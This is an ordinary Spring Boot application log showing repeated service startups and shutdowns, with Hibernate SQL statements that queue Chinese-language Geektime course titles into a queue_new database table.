2020-11-19 07:17:42.468 INFO  geek.me.javaapi.JavaApiApplication Line:651 - No active profile set, falling back to default profiles: default
2020-11-19 07:17:42.818 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:127 - Bootstrapping Spring Data JPA repositories in DEFERRED mode.
2020-11-19 07:17:42.903 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:187 - Finished Spring Data repository scanning in 80ms. Found 19 JPA repository interfaces.
2020-11-19 07:17:43.022 INFO  org.springframework.cloud.context.scope.GenericScope Line:295 - BeanFactory id=712cf88e-c083-3907-88de-02f90b8f246d
2020-11-19 07:17:43.274 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:108 - Tomcat initialized with port(s): 8080 (http)
2020-11-19 07:17:43.285 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Initializing ProtocolHandler ["http-nio-8080"]
2020-11-19 07:17:43.285 INFO  org.apache.catalina.core.StandardService Line:173 - Starting service [Tomcat]
2020-11-19 07:17:43.285 INFO  org.apache.catalina.core.StandardEngine Line:173 - Starting Servlet engine: [Apache Tomcat/9.0.37]
2020-11-19 07:17:43.356 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring embedded WebApplicationContext
2020-11-19 07:17:43.356 INFO  org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext Line:285 - Root WebApplicationContext: initialization completed in 875 ms
2020-11-19 07:17:43.488 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:181 - Initializing ExecutorService 'applicationTaskExecutor'
2020-11-19 07:17:43.496 INFO  com.zaxxer.hikari.HikariDataSource Line:110 - HikariPool-1 - Starting...
2020-11-19 07:17:43.589 INFO  com.zaxxer.hikari.HikariDataSource Line:123 - HikariPool-1 - Start completed.
2020-11-19 07:17:43.681 INFO  org.hibernate.jpa.internal.util.LogHelper Line:31  - HHH000204: Processing PersistenceUnitInfo [name: default]
2020-11-19 07:17:43.723 INFO  org.hibernate.Version Line:44  - HHH000412: Hibernate ORM core version 5.4.20.Final
2020-11-19 07:17:43.827 INFO  org.hibernate.annotations.common.Version Line:49  - HCANN000001: Hibernate Commons Annotations {5.1.0.Final}
2020-11-19 07:17:43.897 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 07:17:43.902 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 07:17:43.916 INFO  org.hibernate.dialect.Dialect Line:170 - HHH000400: Using dialect: org.hibernate.dialect.MySQL55Dialect
2020-11-19 07:17:44.478 INFO  org.hibernate.engine.transaction.jta.platform.internal.JtaPlatformInitiator Line:52  - HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
2020-11-19 07:17:44.485 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:416 - Initialized JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 07:17:45.305 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 07:17:45.415 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Starting ProtocolHandler ["http-nio-8080"]
2020-11-19 07:17:45.431 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:220 - Tomcat started on port(s): 8080 (http) with context path ''
2020-11-19 07:17:46.529 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 07:17:46.534 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:49  - Triggering deferred initialization of Spring Data repositories…
2020-11-19 07:17:46.943 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:53  - Spring Data repositories initialized!
2020-11-19 07:17:46.948 INFO  geek.me.javaapi.JavaApiApplication Line:61  - Started JavaApiApplication in 7.236 seconds (JVM running for 8.088)
2020-11-19 07:17:47.259 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring DispatcherServlet 'dispatcherServlet'
2020-11-19 07:17:47.259 INFO  org.springframework.web.servlet.DispatcherServlet Line:525 - Initializing Servlet 'dispatcherServlet'
2020-11-19 07:17:47.265 INFO  org.springframework.web.servlet.DispatcherServlet Line:547 - Completed initialization in 6 ms
2020-11-19 07:18:12.783 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.force 
as force3_18_0_, queueentit0_.name as name4_18_0_, queueentit0_.todo as todo5_18_0_ from queue_new 
queueentit0_ where queueentit0_.item_id=459081746926346 
 {executed in 0 msec}
2020-11-19 07:18:12.788 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|------|-----|-----|
|item_id |base_path |force |name |todo |
|--------|----------|------|-----|-----|
|--------|----------|------|-----|-----|

2020-11-19 07:22:09.992 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:598 - Closing JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 07:22:09.993 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:218 - Shutting down ExecutorService 'applicationTaskExecutor'
2020-11-19 07:22:09.993 INFO  com.zaxxer.hikari.HikariDataSource Line:350 - HikariPool-1 - Shutdown initiated...
2020-11-19 07:22:09.998 INFO  com.zaxxer.hikari.HikariDataSource Line:352 - HikariPool-1 - Shutdown completed.
2020-11-19 07:22:36.603 INFO  geek.me.javaapi.JavaApiApplication Line:651 - No active profile set, falling back to default profiles: default
2020-11-19 07:22:36.948 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:127 - Bootstrapping Spring Data JPA repositories in DEFERRED mode.
2020-11-19 07:22:37.027 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:187 - Finished Spring Data repository scanning in 73ms. Found 19 JPA repository interfaces.
2020-11-19 07:22:37.146 INFO  org.springframework.cloud.context.scope.GenericScope Line:295 - BeanFactory id=712cf88e-c083-3907-88de-02f90b8f246d
2020-11-19 07:22:37.402 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:108 - Tomcat initialized with port(s): 8080 (http)
2020-11-19 07:22:37.408 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Initializing ProtocolHandler ["http-nio-8080"]
2020-11-19 07:22:37.409 INFO  org.apache.catalina.core.StandardService Line:173 - Starting service [Tomcat]
2020-11-19 07:22:37.409 INFO  org.apache.catalina.core.StandardEngine Line:173 - Starting Servlet engine: [Apache Tomcat/9.0.37]
2020-11-19 07:22:37.482 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring embedded WebApplicationContext
2020-11-19 07:22:37.482 INFO  org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext Line:285 - Root WebApplicationContext: initialization completed in 866 ms
2020-11-19 07:22:37.615 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:181 - Initializing ExecutorService 'applicationTaskExecutor'
2020-11-19 07:22:37.622 INFO  com.zaxxer.hikari.HikariDataSource Line:110 - HikariPool-1 - Starting...
2020-11-19 07:22:37.718 INFO  com.zaxxer.hikari.HikariDataSource Line:123 - HikariPool-1 - Start completed.
2020-11-19 07:22:37.808 INFO  org.hibernate.jpa.internal.util.LogHelper Line:31  - HHH000204: Processing PersistenceUnitInfo [name: default]
2020-11-19 07:22:37.852 INFO  org.hibernate.Version Line:44  - HHH000412: Hibernate ORM core version 5.4.20.Final
2020-11-19 07:22:37.958 INFO  org.hibernate.annotations.common.Version Line:49  - HCANN000001: Hibernate Commons Annotations {5.1.0.Final}
2020-11-19 07:22:38.030 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 07:22:38.034 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 07:22:38.044 INFO  org.hibernate.dialect.Dialect Line:170 - HHH000400: Using dialect: org.hibernate.dialect.MySQL55Dialect
2020-11-19 07:22:38.616 INFO  org.hibernate.engine.transaction.jta.platform.internal.JtaPlatformInitiator Line:52  - HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
2020-11-19 07:22:38.623 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:416 - Initialized JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 07:22:39.447 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 07:22:39.514 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Starting ProtocolHandler ["http-nio-8080"]
2020-11-19 07:22:39.530 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:220 - Tomcat started on port(s): 8080 (http) with context path ''
2020-11-19 07:22:39.745 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring DispatcherServlet 'dispatcherServlet'
2020-11-19 07:22:39.745 INFO  org.springframework.web.servlet.DispatcherServlet Line:525 - Initializing Servlet 'dispatcherServlet'
2020-11-19 07:22:39.751 INFO  org.springframework.web.servlet.DispatcherServlet Line:547 - Completed initialization in 5 ms
2020-11-19 07:22:40.629 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 07:22:40.634 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:49  - Triggering deferred initialization of Spring Data repositories…
2020-11-19 07:22:41.141 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:53  - Spring Data repositories initialized!
2020-11-19 07:22:41.146 INFO  geek.me.javaapi.JavaApiApplication Line:61  - Started JavaApiApplication in 7.377 seconds (JVM running for 8.231)
2020-11-19 07:23:37.458 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=459081746926346 
 {executed in 1 msec}
2020-11-19 07:23:37.467 INFO  jdbc.resultsettable Line:610 - 
|---------|-------------------------------|--------------------|-----|
|item_id  |base_path                      |name                |todo |
|---------|-------------------------------|--------------------|-----|
|[unread] |00-资源文件/14-极客时间/01-专栏课/051-99/ |99-JavaScript核心原理解析 |1    |
|---------|-------------------------------|--------------------|-----|

2020-11-19 07:23:37.477 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=626896109933850 
 {executed in 0 msec}
2020-11-19 07:23:37.478 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.486 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'98-设计模式之美', 1, 626896109933850) 
 {executed in 0 msec}
2020-11-19 07:23:37.493 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=621195835058382 
 {executed in 0 msec}
2020-11-19 07:23:37.494 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.495 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'97-项目管理实战20讲', 1, 621195835058382) 
 {executed in 0 msec}
2020-11-19 07:23:37.499 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=936433950782588 
 {executed in 0 msec}
2020-11-19 07:23:37.500 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.501 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'95-苏杰的产品创新课', 1, 936433950782588) 
 {executed in 0 msec}
2020-11-19 07:23:37.506 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=855137735533744 
 {executed in 0 msec}
2020-11-19 07:23:37.507 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.508 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'94-DDD实战课', 1, 855137735533744) 
 {executed in 0 msec}
2020-11-19 07:23:37.513 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=952316731239648 
 {executed in 1 msec}
2020-11-19 07:23:37.513 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.514 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'92-DevOps实战笔记', 1, 952316731239648) 
 {executed in 0 msec}
2020-11-19 07:23:37.519 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=876595205877896 
 {executed in 0 msec}
2020-11-19 07:23:37.520 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.521 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'91-说透中台', 1, 876595205877896) 
 {executed in 0 msec}
2020-11-19 07:23:37.526 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=861073733380654 
 {executed in 1 msec}
2020-11-19 07:23:37.526 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.528 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'90-分布式技术原理与算法解析', 1, 861073733380654) 
 {executed in 1 msec}
2020-11-19 07:23:37.533 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=476330106989327 
 {executed in 0 msec}
2020-11-19 07:23:37.533 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.535 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'88-高并发系统设计40问', 1, 476330106989327) 
 {executed in 1 msec}
2020-11-19 07:23:37.539 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=283828550600385 
 {executed in 0 msec}
2020-11-19 07:23:37.540 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.541 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'87-全栈工程师修炼指南', 1, 283828550600385) 
 {executed in 1 msec}
2020-11-19 07:23:37.545 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=789557280998655 
 {executed in 0 msec}
2020-11-19 07:23:37.546 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.547 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'86-即时消息技术剖析与实战', 1, 789557280998655) 
 {executed in 0 msec}
2020-11-19 07:23:37.551 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=1004252009859251 
 {executed in 0 msec}
2020-11-19 07:23:37.552 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.553 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'85-研发效率破局之道', 1, 1004252009859251) 
 {executed in 1 msec}
2020-11-19 07:23:37.557 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=877479874575179 
 {executed in 0 msec}
2020-11-19 07:23:37.558 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.560 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'83-编译原理之美', 1, 877479874575179) 
 {executed in 2 msec}
2020-11-19 07:23:37.565 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=1009872364102685 
 {executed in 1 msec}
2020-11-19 07:23:37.565 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.566 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'81-浏览器工作原理与实践', 1, 1009872364102685) 
 {executed in 0 msec}
2020-11-19 07:23:37.571 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=787964344536295 
 {executed in 1 msec}
2020-11-19 07:23:37.571 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.572 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'80-网络编程实战', 1, 787964344536295) 
 {executed in 0 msec}
2020-11-19 07:23:37.578 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=1022101157981678 
 {executed in 1 msec}
2020-11-19 07:23:37.578 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.580 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'79-消息队列高手课', 1, 1022101157981678) 
 {executed in 1 msec}
2020-11-19 07:23:37.584 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=409602706903658 
 {executed in 0 msec}
2020-11-19 07:23:37.585 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.586 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'77-从0打造音视频直播系统', 1, 409602706903658) 
 {executed in 0 msec}
2020-11-19 07:23:37.590 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=781941951179116 
 {executed in 0 msec}
2020-11-19 07:23:37.590 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.591 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'75-编辑训练营', 1, 781941951179116) 
 {executed in 0 msec}
2020-11-19 07:23:37.596 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=823812106395779 
 {executed in 0 msec}
2020-11-19 07:23:37.596 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.598 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'74-Flutter核心技术与实战', 1, 823812106395779) 
 {executed in 1 msec}
2020-11-19 07:23:37.601 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=954967934009220 
 {executed in 0 msec}
2020-11-19 07:23:37.601 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.603 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'73-黄勇的OKR实战笔记', 1, 954967934009220) 
 {executed in 0 msec}
2020-11-19 07:23:37.606 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=773737007105338 
 {executed in 0 msec}
2020-11-19 07:23:37.607 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.608 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'53-OpenResty从入门到实战', 1, 773737007105338) 
 {executed in 0 msec}
2020-11-19 07:23:37.611 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=300655922831157 
 {executed in 0 msec}
2020-11-19 07:23:37.612 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.613 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'52-透视HTTP协议', 1, 300655922831157) 
 {executed in 0 msec}
2020-11-19 07:23:37.616 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_0_, queueentit0_.base_path as base_pat2_18_0_, queueentit0_.name 
as name3_18_0_, queueentit0_.todo as todo4_18_0_ from queue_new queueentit0_ where queueentit0_.item_id=390535478164697 
 {executed in 0 msec}
2020-11-19 07:23:37.617 INFO  jdbc.resultsettable Line:610 - 
|--------|----------|-----|-----|
|item_id |base_path |name |todo |
|--------|----------|-----|-----|
|--------|----------|-----|-----|

2020-11-19 07:23:37.618 INFO  jdbc.sqltiming Line:373 - insert into queue_new (base_path, name, todo, item_id) values ('00-资源文件/14-极客时间/01-专栏课/051-99/', 
'51-白话法律42讲', 1, 390535478164697) 
 {executed in 0 msec}
2020-11-19 07:27:46.068 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:598 - Closing JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 07:27:46.069 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:218 - Shutting down ExecutorService 'applicationTaskExecutor'
2020-11-19 07:27:46.069 INFO  com.zaxxer.hikari.HikariDataSource Line:350 - HikariPool-1 - Shutdown initiated...
2020-11-19 07:27:46.074 INFO  com.zaxxer.hikari.HikariDataSource Line:352 - HikariPool-1 - Shutdown completed.
2020-11-19 10:50:28.225 INFO  geek.me.javaapi.JavaApiApplication Line:651 - No active profile set, falling back to default profiles: default
2020-11-19 10:50:28.585 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:127 - Bootstrapping Spring Data JPA repositories in DEFERRED mode.
2020-11-19 10:50:28.665 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:187 - Finished Spring Data repository scanning in 73ms. Found 19 JPA repository interfaces.
2020-11-19 10:50:28.790 INFO  org.springframework.cloud.context.scope.GenericScope Line:295 - BeanFactory id=712cf88e-c083-3907-88de-02f90b8f246d
2020-11-19 10:50:29.055 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:108 - Tomcat initialized with port(s): 8080 (http)
2020-11-19 10:50:29.062 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Initializing ProtocolHandler ["http-nio-8080"]
2020-11-19 10:50:29.062 INFO  org.apache.catalina.core.StandardService Line:173 - Starting service [Tomcat]
2020-11-19 10:50:29.063 INFO  org.apache.catalina.core.StandardEngine Line:173 - Starting Servlet engine: [Apache Tomcat/9.0.37]
2020-11-19 10:50:29.136 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring embedded WebApplicationContext
2020-11-19 10:50:29.136 INFO  org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext Line:285 - Root WebApplicationContext: initialization completed in 897 ms
2020-11-19 10:50:29.270 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:181 - Initializing ExecutorService 'applicationTaskExecutor'
2020-11-19 10:50:29.278 INFO  com.zaxxer.hikari.HikariDataSource Line:110 - HikariPool-1 - Starting...
2020-11-19 10:50:29.390 INFO  com.zaxxer.hikari.HikariDataSource Line:123 - HikariPool-1 - Start completed.
